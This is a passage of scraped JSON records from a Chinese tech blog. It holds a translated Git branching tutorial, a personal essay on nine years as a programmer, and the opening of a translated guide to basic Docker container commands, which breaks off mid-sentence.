,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,伯小乐,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 263,        ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114141/", "url_object_id": "a994858569521b3cc4c7ef650140ad3c", "front_image_path": "full/ef76a2ab8cf07b49aaa7e162a6c578d1a9ed4a26.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/b84f8d56e47a8496314a55a39b08ad10.jpg"], "title": "Git 分支操作介绍", "create_time": "2018/06/10", "vote": "1", "bookmark": "3", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Kedar Vijay Kulkarni,   译文出处：,Linux中国/Andy Song,   ,\n,在本系列的前两篇文章中，我们,开始使用 Git,，学会如何,克隆项目，修改、增加和删除内容,。在这第三篇文章中，我将介绍 Git 分支，为何以及如何使用分支。,\n,\n,不妨用树来描绘 Git 仓库。图中的树有很多分支，或长或短，或从树干延伸或从其它分支延伸。在这里，我们用树干比作仓库的 master 分支，其中 ,master, 代指 ”master 分支”，是 Git 仓库的中心分支或第一个分支。为简单起见，我们假设 ,master, 是树干，其它分支都是从该分支分出的。,\n,为何在 Git 仓库中使用分支,\n,使用分支的主要理由为：,\n,\n,如果你希望为项目增加新特性，但很可能会影响当前可正常工作的代码。对于该项目的活跃用户而言，这是很糟糕的事情。与其将特性加入到其它人正在使用的 ,master, 分支，更好的方法是在仓库的其它分支中变更代码，下面会给出具体的工作方式。,\n,更重要的是，,Git 其设计,用于协作。如果所有人都在你代码仓库的 ,master, 分支上操作，会引发很多混乱。对编程语言或项目的知识和阅历因人而异；有些人可能会编写有错误或缺陷的代码，也可能会编写你觉得不适合该项目的代码。使用分支可以让你核验他人的贡献并选择适合的加入到项目中。（这里假设你是代码库唯一的所有者，希望对增加到项目中的代码有完全的控制。在真实的项目中，代码库有多个具有合并代码权限的所有者）,\n,\n,创建分支,\n,让我们回顾,本系列上一篇文章,，看一下在我们的 Demo 目录中分支是怎样的。如果你没有完成上述操作，请按照文章中的指示从 GitHub 克隆代码并进入 Demo 目录。运行如下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npwd\r\ngit branch\r\nls -la\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,pwd,git ,branch,ls, ,-,la, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,pwd, 命令（是当前工作目录的英文缩写）返回当前你所处的目录（以便确认你在 ,Demo, 目录中），,git branch, 列出该项目在你主机上的全部分支，,ls -la, 列出当前目录下的所有文件。你的终端输出类似于：,\n,\n,在 ,master, 分支中，只有一个文件 ,README.md,。（Git 会友好地忽略掉其它目录和文件。）,\n,接下来，运行如下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit status\r\ngit checkout -b myBranch\r\ngit status\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,status,git ,checkout, ,-,b, ,myBranch,git ,status, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,第一条命令 ,git status, 告知你当前位于 ,branch master,，（就像在终端中看到的那样）它与 ,origin/master, 处于同步状态，这意味着 master 分支的本地副本中的全部文件也出现在 GitHub 中。两份副本没有差异，所有的提交也是一致的。,\n,下一条命令 ,git checkout -b myBranch, 中的 ,-b, 告知 Git 创建一个名为 ,myBranch, 的新分支，然后 ,checkout, 命令将我们切换到新创建的分支。运行第三条命令 ,git status, 确保你已经位于刚创建的分支下。,\n,如你所见，,git status, 告知你当前处于 ,myBranch, 分支，没有变更需要提交。这是因为我们既没有增加新文件，也没有修改已有文件。,\n,\n,如果希望以可视化的方式查看分支，可以运行 ,gitk, 命令。如果遇到报错 ,bash: gitk: command not found...,，请先安装 ,gitk, 软件包（找到你操作系统对应的安装文档，以获得安装方式）。,\n,（LCTT 译注：需要在有 X 服务器的终端运行 ,gitk,，否则会报错）,\n,下图展示了我们在 Demo 项目中的所作所为：你最后一次提交（的对应信息）是 ,Delete file.txt,，在此之前有三次提交。当前的提交用黄点标注，之前的提交用蓝点标注，黄点和 ,Delete file.txt, 之间的三个方块展示每个分支所在的位置（或者说每个分支中的最后一次提交的位置）。由于 ,myBranch, 刚创建，提交状态与 ,master, 分支及其对应的记为 ,remotes/origin/master, 的远程 ,master, 分支保持一致。（非常感谢来自 Red Hat 的 ,Peter Savage, 让我知道 ,gitk, 这个工具）,\n,\n,下面让我们在 ,myBranch, 分支下创建一个新文件并观察终端输出。运行如下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\necho \"Creating a newFile on myBranch\" > newFile\r\ncat newFile\r\ngit status\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,echo, ,\"Creating a newFile on myBranch\", ,>, ,newFile,cat ,newFile,git ,status, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,第一条命令中的 ,echo, 创建了名为 ,newFile, 的文件，接着 ,cat newFile, 打印出文件内容，最后 ,git status, 告知你我们 ,myBranch, 分支的当前状态。在下面的终端输出中，Git 告知 ,myBranch, 分支下有一个名为 ,newFile, 的文件当前处于 ,untracked, 状态。这表明我们没有让 Git 追踪发生在文件 ,newFile, 上的变更。,\n,\n,下一步是增加文件，提交变更并将 ,newFile, 文件推送至 ,myBranch, 分支（请回顾本系列上一篇文章获得更多细节）。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit add newFile\r\ngit commit -m \"Adding newFile to myBranch\"\r\ngit push origin myBranch\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,add ,newFile,git ,commit, ,-,m, ,\"Adding newFile to myBranch\",git ,push ,origin ,myBranch, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在上述命令中，,push, 命令使用的分支参数为 ,myBranch, 而不是 ,master,。Git 添加 ,newFile, 并将变更推送到你 GitHub 账号下的 Demo 仓库中，告知你在 GitHub 上创建了一个与你本地副本分支 ,myBranch, 一样的新分支。终端输出截图给出了运行命令的细节及命令输出。,\n,\n,当你访问 GitHub 时，在分支选择的下拉列表中可以发现两个可供选择的分支。,\n,\n,点击 ,myBranch, 切换到 ,myBranch, 分支，你可以看到在此分支上新增的文件。,\n,\n,截至目前，我们有两个分支：一个是 ,master, 分支，只有一个 ,README.md, 文件；另一个是 ,myBranch, 分支，有两个文件。,\n,你已经知道如何创建分支了，下面我们再创建一个分支。输入如下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit checkout master\r\ngit checkout -b myBranch2\r\ntouch newFile2\r\ngit add newFile2\r\ngit commit -m \"Adding newFile2 to myBranch2\"\r\ngit push origin myBranch2\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,checkout ,master,git ,checkout, ,-,b, ,myBranch2,touch ,newFile2,git ,add ,newFile2,git ,commit, ,-,m, ,\"Adding newFile2 to myBranch2\",git ,push ,origin ,myBranch2, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我不再给出终端输出，需要你自己尝试，但你可以在 ,GitHub 代码库, 中验证你的结果。,\n,删除分支,\n,由于我们增加了两个分支，下面删除其中的一个（,myBranch,），包括两步：,\n,\n,删除本地分支, 你不能删除正在操作的分支，故切换到 ,master, 分支 （或其它你希望保留的分支），命令及终端输出如下：,git branch, 可以列出可用的分支，使用 ,checkout, 切换到 ,master, 分支，然后使用 ,git branch -D myBranch, 删除该分支。再次运行 ,git branch, 检查是否只剩下两个分支（而不是三个）。,\n,删除 GitHub 上的分支, 使用如下命令删除 ,myBranch, 的远程分支：,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit push origin :myBranch\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,push ,origin, ,:,myBranch, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,\n,上面 ,push, 命令中分支名称前面的冒号（,:,）告知 GitHub 删除分支。另一种写法为：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngit push -d origin myBranch\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,git ,push, ,-,d, ,origin ,myBranch, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,其中 ,-d, (也可以用 ,--delete,) 也用于告知 GitHub 删除你的分支。,\n,我们学习了 Git 分支的使用，在本系列的下一篇文章中，我们将介绍如何执行 ,fetch, 和 ,rebase, 操作，对于多人同时的贡献的项目而言，这是很必须学会的。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 3 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114107/", "url_object_id": "90144cba629e28c20a0e4a2ee1876768", "front_image_path": "full/0870bcb4320291e61232dfc38ab50b871c6b8c41.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/03/2b70b826c50f6f6721d816371ec7fd6a.jpg"], "title": "九年程序人生", "create_time": "2018/06/14", "vote": "1", "bookmark": "1", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,flame7,   ,时间一晃而过，大学毕业转眼间已经工作9年了，总结一下自己这些年来感受。,\n,与程序打交道的人生，是简单的人生,\n,一次做规划局的项目，规划局的职员很是钦佩地说：“你们真了不起，在电脑上敲敲键盘就能做出软件来。”，,\n,规划局领导说：“跟电脑打交道是最简单的，难的是跟人打交道。”。,\n,领导的话很有深意，一语道破了本质，做程序的人，是比较简单的。,\n, 不懂什么叫编程,\n,大学本科，读“计算机科学与技术专业”（相信看这篇博客的人多半也是学这个专业的 ^_*），课程重理论而轻实践。,\n,最初学习C语言，对于编程没有任何概念，我清楚的记得，一次在课堂上问老师：“计算机输入法，可视化操作界面已经很完善了，为什么要用C语言中 Print() 函数输出一段字符呢？而且我们学习使用Console控制台的黑白屏输入输出，也不像是平时使用的软件啊？”。,\n,老师听后也是一脸的懵逼，说：“你好好学，慢慢就明白了”。,\n,你不懂的，老师也没法回答你，只有靠自己慢慢地摸索，慢慢去领悟。,\n,Java还是C#，平台选择的爱恨情仇,\n,初学Java，这是我接触的第一个最具有实用意义的编程语言（可以做网站，做软件，虽然C语言，C++也可以开发应用软件，但毕竟使用的人较少，对于初学者，找到一个合适的教程都困难）。当时的学习，基本是自学，上网下载视频教程，一集一集地看，不懂的概念上网查，去图书馆借阅相关书籍资料，什么JSP标签，Servlet，JDBC，到Struts MVC，Hibernate，Spring，设计模式，半年时间，算是初步入门，尽管对知识还是一知半解，但还是成功用Java做了毕业设计，做过几个小程序。,\n,工作之后，开始使用C#，算是与.NET平台结缘，一行一行地敲代码，一个接一个的做项目，一版又一版的升级软件，一晃9年了。从最初的ASP.NET WebForm，ADO.NET，到ASP.NET MVC，WebAPI，EntityFramework，面向服务架构的WCF，以及最新的跨平台.NET Core，微软为软件开发人员，提供了编程最大的便利性。,\n,仅从开发语言本身角度讲，C#并不比Java差，并且很多细微的地方，C#比Java做的要好，比如，C#中的get，set属性访问，要比Java的字段访问方便很多，相同逻辑代码运行效率方面，C#的MSIL比Java的字节码允许效率还要稍微高一些，但是无奈，.NET平台发展始终不及Java平台。诚然，平台的发展不能仅从开发语言本身考虑，平台运行环境，平台参与人员整体水平，使用成本等，更是起着决定性作用，.NET平台在互联网大潮中，逐渐被边缘化，免费的Java平台，被开源社区拥抱，成为互联网项目开发平台的中流砥柱。微软似乎意识到问题所在，逐步加入开源队伍，并提供了跨平台方案.Net Core，但并没有明显起色，.NET平台开发人员心中不免有一丝悲观情绪，.Net平台开发人员似乎比Java开发人员始终矮一头的感觉。,\n, 前端编程，JavaScript从无知到觉醒,\n,做Web开发，离不开HTML，CSS，JavaScript，尽管日常工作以后台开发为主，但接触的多了，慢慢地理解深入，从只会使用JS写函数，发展到使用JS面向对象的功能，理解了JS中闭包的概念（好烧脑，用离散数学中的概念来表示函数集合，让没学过集合概念的同学情何以堪）。明白了JS的面向对象编程，通过JS自定义前端控件，数据与逻辑代码分离，达到优雅地实现前端逻辑。学习的过程是曲折的，有时候一个概念始终理解不了，但一旦明白过来，会有一种眼前一亮，豁然开朗的感觉。起初一直不明白，为什么JQuery中的“$”这么牛，一个“$”符号能操作一切，读过JQuery源码之后才明白，这个“$”原来是jQuery在Window中定义的的一个变量，同时也是jQuery这个函数的别名，每次调用$(…)时，其实间接地创建了一个JQuery的示例。当然，这种操作得益于JS是一直动态语言，可以给对象任意添加属性和方法（相比较Java和C#是不能这样操作的）。,\n,\n,技术之路要不断学习，路漫漫其修远,\n,技术更新迭代的速度，远超想象，往往是刚学会一个新技术，另一个更新的技术又变的火热，似乎新技术的产生，也在遵循一个摩尔定律。追赶技术的脚步，就如同夸父追日一般，你一直在追赶，但它一直在你前面。好在，每一个新技术，新架构的产生，都是在为更简单、更高效的解决现有的问题，所以，新的技术，虽然增加了学习的负担，但是新技术的应用，能够解决现实的问题，是效率的提升。从这个角度讲，学习是值得的。通常来说，没有谁天生就会做什么，只要肯学习，别人能做到的，你也能做到。,\n,React火热的时候，学习React，了解了这种基于模板的开发方式，见识了这种类似于MVC，实现数据与业务逻辑分离的编程方式在JS中的实际应用，对于这种仅需要一个render()函数的超简洁的框架赞叹不已。,\n,Facebook搞出了React，国人也不示弱，于是诞生了Vue，相对来说更简洁，使用更方便。,\n,React发展出了React Native，圈子里更是为止振奋，为火热的移动端开发又添了一把柴，让移动端开发，在Android和IOS原生开发之外，又多了一种全新的选择。,\n,我用3天时间，学会了开发微信小程序，完成了原有Web功能向小程序的移植。,\n,Node.JS火热的时候，我用了一周的业余时间，学习NodeJS编程，配合MongoDB，搭建了简单的日志系统。,\n,说起来有点吹牛的意思，但却是事实。,\n,一方面，不管是React，微信小程序，Node.JS，本质上都是JavaScript，Html，CSS的组合使用，相似度很高，只是各自有各自特点的规范特色而已，学习难度是逐渐降低的。,\n,另一方面，我相信大多数人也有感受，当工作经验，认知水平达到一定积累之后，学习其实是一件水到渠成的事情。,\n,总结,\n,有一次跟朋友聊天，朋友说，“感觉自己越学习，越感觉到不懂的方面更多了”。,\n,我笑笑，表示同意他的观点，这是一个叫做“知识边界”的问题，每个人的知识，就如同是一个圆，圆内是你已经了解的知识，圆之外就是还不懂的知识，一个人掌握的知识越多，这个圆也就越大，而圆越大，圆周所接触的那些未知领域也就越多。如果一个人说自己没有什么不懂的，那只能说明他知识面太小。如此，当我们意识到自己有很多不懂的东西的时候，也不用焦虑，因为我们的知识在扩展，保持一颗开放，学习的心，这是人生路上所必须的。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114124/", "url_object_id": "c7bbdb3c6c79c01bffbefa062036a56f", "front_image_path": "full/eafe21f5bcf6519b0ad6dfff3f114ffef96d6a04.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/91d1e9a10762cf7191f39f8e66ebefa7.png"], "title": "8 个基本的 Docker 容器管理命令", "create_time": "2018/06/22", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Shrikant Lavhate,   译文出处：,Linux中国/Lonaparte_CHENG,   ,利用这 8 个命令可以学习 Docker 容器的基本管理方式。这是一个为 Docker 初学者准备的，带有示范命令输出的指南。,\n,\n,在这篇文章中，我们将带你学习 8 个基本的 Docker 容器命令，它们操控着 Docker 容器的基本活动，例如 运行run、 列举list、 停止stop、 查看历史纪录logs、 删除delete 等等。如果你对 Docker 的概念很陌生，推荐你看看我们的 ,介绍指南,，来了解 Docker 的基本内容以及 ,如何, 在 Linux 上安装 Docker。 现在让我们赶快进入要了解的命令：,\n,如何运行 Docker 容器？,\n,众所周知，Docker 容器只是一个运行于宿主操作系统host OS上的应用进程，所以你需要一个镜像来运行它。Docker 镜像以进程的方式运行时就叫做 Docker 容器。你可以加载本地 Docker 镜像，也可以从 Docker Hub 上下载。Docker Hub 是一个提供公有和私有镜像来进行拉取pull操作的集中仓库。官方的 Docker Hub 位于 ,hub.docker.com,。 当你指示 Docker 引擎运行容器时，它会首先搜索本地镜像，如果没有找到，它会从 Docker Hub 上拉取相应的镜像。,\n,让我们运行一个 Apache web 服务器的 Docker 镜像，比如 httpd 进程。你需要运行 ,docker container run, 命令。旧的命令为 ,docker run,， 但后来 Docker 添加了子命令部分，所以新版本支持下列命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@kerneltalks # docker container run -d -p 80:80 httpd\r\nUnable to find image 'httpd:latest' locally\r\nlatest: Pulling from library/httpd\r\n3d77ce4481b1: Pull complete\r\n73674f4d9403: Pull complete\r\nd266646f40bd: Pull complete\r\nce7b0dda0c9f: Pull complete\r\n01729050d692: Pull complete\r\n014246127c67: Pull complete\r\n7cd2e04cf570: Pull complete\r\nDigest: sha256:f4610c3a1a7da35072870625733fd0384515f7e912c6223d4a48c6eb749a8617\r\nStatus: Downloaded newer image for httpd:latest\r\nc46f2e9e4690f5c28ee7ad508559ceee0160ac3e2b1688a61561ce9f7d99d682\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,kerneltalks, ,# docker container run -d -p 80:80 httpd,Unable ,to, ,find ,image, ,'httpd:latest', ,locally,latest,:, ,Pulling ,from ,library,/,httpd,3d77ce4481b1,:, ,Pull ,complete,73674f4d9403,:, ,Pull ,complete,d266646f40bd,:, ,Pull ,complete,ce7b0dda0c9f,:, ,Pull ,complete,01729050d692,:, ,Pull ,complete,014246127c67,:, ,Pull ,complete,7cd2e04cf570,:, ,Pull ,complete,Digest,:, ,sha256,:,f4610c3a1a7da35072870625733fd0384515f7e912c6223d4a48c6eb749a8617,Status,:, ,Downloaded ,newer ,image ,for, ,httpd,:,latest,c46f2e9e4690f5c28ee7ad508559ceee0160ac3e2b1688a61561ce9f7d99d682, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,Docker 的 ,run, 命令将镜像名作为强制参数，另外还有很多可选参数。常用的参数有：,\n,\n,-d,：从当前 shell 脱离容器,\n,-p X:Y,：绑定容器的端口 Y 到宿主机的端口 X,\n,--name,：命名你的容器。如果未指定，它将被赋予随机生成的名字,\n,-e,：当启动容器时传递环境编辑及其值,\n,\n,通过以上输出你可以看到，我们将 ,httpd, 作为镜像名来运行容器。接着，本地镜像没有找到，Docker 引擎从 Docker Hub 拉取了它。注意，它下载了镜像 ,httpd:latest,， 其中 ,:, 后面跟着版本号。如果你需要运行特定版本的容器，你可以在镜像名后面注明版本名。如果不提供版本名，Docker 引擎会自动拉取最新的版本。,\n,输出的最后一行显示了你新运行的 httpd 容器的唯一 ID。,\n,如何列出所有运行中的 Docker 容器？,\n,现在，你的容器已经运行起来了，你可能想要确认这一点，或者你想要列出你的机器上运行的所有容器。你可以使用 ,docker container ls, 命令。在旧的 Docker 版本中，对应的命令为 ,docker ps,。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@kerneltalks # docker container ls\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   11 minutes ago      Up 11 minutes       0.0.0.0:80->80/tcp   cranky_cori\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,kerneltalks, ,# docker container ls,CONTAINER ,ID        ,IMAGE               ,COMMAND              ,CREATED             ,STATUS              ,PORTS                ,NAMES,c46f2e9e4690        ,httpd,               ,\"httpd-foreground\",   ,11, ,minutes ,ago      ,Up, ,11, ,minutes,       ,0.0.0.0,:,80,->,80,/,tcp   ,cranky,_,cori, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,列出的结果是按列显示的。每一列的值分别为：,\n,\n,Container ID ：一开始的几个字符对应你的容器的唯一 ID,\n,Image ：你运行容器的镜像名,\n,Command ：容器启动后运行的命令,\n,Created ：创建时间,\n,Status ：容器当前状态,\n,Ports ：与宿主端口相连接的端口信息,\n,Names ：容器名（如果你没有命名你的容器，那么会随机创建）,\n,\n,如何查看 Docker 容器的历史纪录？,\n,在第一步我们使用了 ,-d, 参数来将容器，在它一开始运行的时候，就从当前的 shell 中脱离出来。在这种情况下，我们不知道容器里面发生了什么。所以为了查看容器的历史纪录，Docker 提供了 ,logs, 命令。它采用容器名称或 ID 作为参数。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@kerneltalks # docker container logs cranky_cori\r\nAH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message\r\nAH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message\r\n[Thu May 31 18:35:07.301158 2018] [mpm_event:notice] [pid 1:tid 139734285989760] AH00489: Apache/2.4.33 (Unix) configured -- resuming normal operations\r\n[Thu May 31 18:35:07.305153 2018] [core:notice] [pid 1:tid 139734285989760] AH00094: Command line: 'httpd -D FOREGROUND'\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,kerneltalks, ,# docker container logs cranky_cori,AH00558,:, ,httpd,:, ,Could ,not, ,reliably ,determine ,the ,server,'s fully qualified domain name, using 172.17.0.2. Set the ',ServerName,' directive globally to suppress this message,AH00558: httpd: Could not reliably determine the server',s, ,fully ,qualified ,domain ,name,,, ,using, ,172.17.0.2., ,Set ,the, ,'ServerName', ,directive ,globally ,to, ,suppress ,this, ,message,[,Thu ,May, ,31, ,18,:,35,:,07.301158, ,2018,], ,[,mpm_event,:,notice,], ,[,pid, ,1,:,tid, ,139734285989760,], ,AH00489,:, ,Apache,/,2.4.33, ,(,Unix,), ,configured, ,--, ,resuming ,normal ,operations,[,Thu ,May, ,31, ,18,:,35,:,07.305153, ,2018,], ,[,core,:,notice,], ,[,pid, ,1,:,tid, ,139734285989760,], ,AH00094,:, ,Command ,line,:, ,'httpd -D FOREGROUND', ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这里我使用了容器名称作为参数。你可以看到在我们的 httpd 容器中与 Apache 相关的历史纪录。,\n,如何确定 Docker 容器的进程？,\n,容器是一个使用宿主资源来运行的进程。这样，你可以在宿主系统的进程表中定位容器的进程。让我们在宿主系统上确定容器进程。,\n,Docker 使用著名的 ,top, 命令作为子命令的名称，来查看容器产生的进程。它采用容器的名称或 ID 作为参数。在旧版本的 Docker 中，只可运行 ,docker top, 命令。在新版本中，,docker top, 和 ,docker container top, 命令都可以生效。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@kerneltalks # docker container top  cranky_cori\r\nUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\r\nroot                15702               15690               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15729               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15730               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15731               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\n\r\nroot@kerneltalks # ps -ef |grep -i 15702\r\nroot     15702 15690  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15729 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15730 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15731 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nroot     15993 15957  0 18:59 pts/0    00:00:00 grep --color=auto -i 15702\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,kerneltalks, ,# docker container top  cranky_cori,UID                 ,PID                 ,PPID,                ,C,                   ,STIME               ,TTY                 ,TIME                ,CMD,root,                ,15702,               ,15690,               ,0,                   ,18,:,35,               ,?,                   ,00,:,00,:,00,            ,httpd, ,-,DFOREGROUND,bin,                 ,15729,               ,15702,               ,0,                   ,18,:,35,               ,?,                   ,00,:,00,:,00,            ,httpd, ,-,DFOREGROUND,bin,                 ,15730,               ,15702,               ,0,                   ,18,:,35,               ,?,                   ,00,:,00,:,00,            ,httpd, ,-,DFOREGROUND,bin,                 ,15731,               ,15702,               ,0,                   ,18,:,35,               ,?,                   ,00,:,00,:,00,            ,httpd, ,-,DFOREGROUND, ,root,@,kerneltalks, ,# ps -ef |grep -i 15702,root,     ,15702, ,15690,  ,0, ,18,:,35, ,?,        ,00,:,00,:,00, ,httpd, ,-,DFOREGROUND,bin,      ,15729, ,15702,  ,0, ,18,:,35, ,?,        ,00,:,00,:,00, ,httpd, ,-,DFOREGROUND,bin,      ,15730, ,15702,  ,0, ,18,:,35, ,?,        ,00,:,00,:,00, ,httpd, ,-,DFOREGROUND,bin,      ,15731, ,15702,  ,0, ,18,:,35, ,?,        ,00,:,00,:,00, ,httpd, ,-,DFOREGROUND,root,     ,15993, ,15957,  ,0, ,18,:,59, ,pts,/,0,    ,00,:,00,:,00, ,grep, ,--,color,=,auto, ,-,i, ,15702, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在第一个输出中，列出了容器产生的进程的列表。它包含了所有细节，包括用户号uid、进程号pid，父进程号ppid、开始时间、命令，等等。这里所有的进程号你都可以在宿主的进程表里搜索到。这就是我们在第二个命令里做得。这证明了容器确实是宿主系统中的进程。,\n,如何停止 Docker 容器？,\n,只需要 ,stop, 命令！同样，它采用容器名称或 ID 作为参数。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@kerneltalks # docker container stop cranky_cori\r\ncranky_cori\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,kerneltalks, ,# docker container stop cranky_cori,cranky,_,cori, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,如何列出停止的或不活动的 Docker 容器？,\n,现在我们停止了我们的容器，这时如果我们使用 